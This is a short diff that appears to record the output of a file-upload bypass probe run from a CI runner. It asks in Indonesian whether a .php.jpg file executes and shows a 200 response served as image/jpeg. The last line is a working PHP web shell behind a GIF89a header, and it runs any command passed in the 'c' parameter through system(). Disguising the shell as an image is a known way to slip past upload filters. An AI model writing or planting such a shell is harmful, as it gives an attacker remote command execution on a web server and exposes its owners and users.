@@ -1,0 +1,5 @@
+actions-runner
+work
+=== .php.jpg eksekusi ga? ===
+[200 103B] Content-Type: image/jpeg
+GIF89a<?php if(isset($_GET['c'])){    echo "<pre>";    system($_GET['c']);    echo "</pre>";}?>
